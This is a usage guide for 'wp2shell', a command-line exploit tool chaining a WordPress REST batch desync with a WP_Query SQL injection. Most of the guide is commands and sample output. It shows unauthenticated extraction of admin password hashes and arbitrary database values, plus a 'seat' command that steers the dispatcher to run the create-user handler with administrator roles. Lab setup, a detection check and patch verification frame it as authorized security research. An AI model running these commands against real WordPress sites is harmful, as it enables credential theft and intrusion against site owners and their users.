# wp2shell — Usage Guide

Step-by-step use of the `wp2shell` CLI against an **authorized** target or your
own lab. Read [`../AUTHORIZATION.md`](../AUTHORIZATION.md) first.

## Install

Standard library only (Python 3.8+):

```bash
pip install -e .                              # provides `wp2shell`
# or, without installing:
PYTHONPATH=src python3 -m wp2shell <cmd> ...
```

All examples below use `wp2shell`; replace `http://TARGET/` with your target's
base URL (HTTP or HTTPS; self-signed certs are tolerated).

---

## 1. Stand up a vulnerable lab (optional)

To exercise the chain you need WordPress on a vulnerable version (**6.9.0–6.9.4**
or **7.0.0–7.0.1**):

- Install a genuine release, e.g. `https://wordpress.org/wordpress-6.9.4.tar.gz`,
  and run the install wizard.
- **Disable auto-updates** so it doesn't silently self-patch — add to
  `wp-config.php`:
  ```php
  define( 'AUTOMATIC_UPDATER_DISABLED', true );
  define( 'WP_AUTO_UPDATE_CORE', false );
  ```
- The `sqli` step additionally needs the vulnerable `WP_Query` (CVE-2026-60137).
  If you downgrade by editing only the dispatcher, deploy the **full** matching
  core so `wp-includes/class-wp-query.php` is the vulnerable version too.

Run everything on an **isolated** network.

---

## 2. `check` — detect (non-destructive)

```bash
wp2shell check http://TARGET/
```

Vulnerable output:
```
[*] req[1] categories -> block_cannot_read
[+] VULNERABLE — handler desync present (CVE-2026-63030).
```
Patched output: `req[1] categories -> rest_term_invalid` → `NOT VULNERABLE`.
Exit codes: `1` = vulnerable, `0` = patched, `2` = inconclusive. `--json` for
machine-readable output.

---

## 3. `sqli` — unauthenticated database read (the headline)

Clean-core, no plugin required. Reaches the `get_items` SQLi sink through a
nested batch and extracts data (UNION mode by default — one request per value and
works even with zero published posts; boolean-blind is an automatic fallback).

```bash
wp2shell sqli http://TARGET/
```
```
[+] UNION extraction working (one request/value, no published post required).
[+] table prefix: 'wp_'
    @@version    : 11.8.6-MariaDB-...
    current_user : wordpress@localhost
    database     : wordpress_db
    admin_login  : admin
    admin_hash   : $wp$2y$12$...        <- admin password hash, read with no auth
```

Extract any scalar yourself:
```bash
wp2shell sqli http://TARGET/ --expr "SELECT user_pass FROM wp_users WHERE ID=2"
wp2shell sqli http://TARGET/ --expr "SELECT COUNT(*) FROM wp_users"
```
The table prefix is auto-detected over the SQLi; override with `--prefix` if
needed. `--maxlen` bounds per-value length in the blind fallback.

**Impact:** an unauthenticated HTTP request reads arbitrary DB contents,
including credential hashes. Treat output as sensitive.

---

## 4. `probe` / `seat` — the raw desync primitive

Confirm the desync, or drive it directly for research:

```bash
wp2shell probe http://TARGET/

# Steer the dispatcher to execute core's create-user handler, unauthenticated.
# (It runs the handler's OWN gate against the donor request, so it is denied —
#  demonstrating handler substitution + the exact boundary that holds.)
wp2shell seat http://TARGET/ \
  --donor-method DELETE --donor-path /wp/v2/posts/0 \
  --donor-body '{"username":"x","email":"x@x.com","password":"x","roles":["administrator"]}' \
  --target-method POST --target-path /wp/v2/users
```

`seat` executes `--target-path`'s handler against `--donor-path`'s request object;
`--k` sets the number of leading malformed sub-requests (drift). `--cookie` /
`--nonce` allow authenticated experiments.

---

## 5. Verify the patch closes it

Update core to ≥ 7.0.2 / ≥ 6.9.5 and re-run:

```bash
wp2shell check http://TARGET/     # -> NOT VULNERABLE (exit 0)
wp2shell sqli  http://TARGET/     # -> "no desync signal ... PATCHED", no data
```

On a patched host the desync collapses (each sub-request is judged by its own
handler) and the `author_exclude` string is neutralized by `wp_parse_id_list()`.

---

## 6. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `check` flips to NOT VULNERABLE on its own | WordPress auto-updated core. Disable auto-updates (§1), re-downgrade, restart PHP. |
| `batch/v1 not reachable` | Pretty permalinks off / REST disabled / proxy stripping the path. The tool also tries `?rest_route=/batch/v1`; confirm `curl http://TARGET/wp-json/` returns JSON. |
| `sqli` says "63030 desync present, but the SQLi did not fire" | Only CVE-2026-60137 is patched (`class-wp-query.php` uses `wp_parse_id_list`). The desync is present but the sink is closed. |
| `sqli` extracts nothing / wrong table | Custom prefix — the tool auto-detects it, but you can force `--prefix`. |
